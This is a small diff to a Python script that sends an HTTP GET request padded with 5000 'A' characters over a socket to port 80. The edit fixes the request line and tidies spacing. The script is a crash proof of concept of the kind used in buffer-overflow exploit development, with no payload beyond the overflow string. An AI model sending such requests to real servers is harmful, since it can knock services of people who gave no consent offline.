@@ -132,11 +132,11 @@ port = 80
 crash = "A" * 5000
 
 
-buffer="GET\n"
+buffer="GET "
 buffer+=crash
 buffer+=" HTTP/1.1\r\n"
 
-expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
 expl.connect((ip, port))
 expl.send(buffer)
 expl.close()
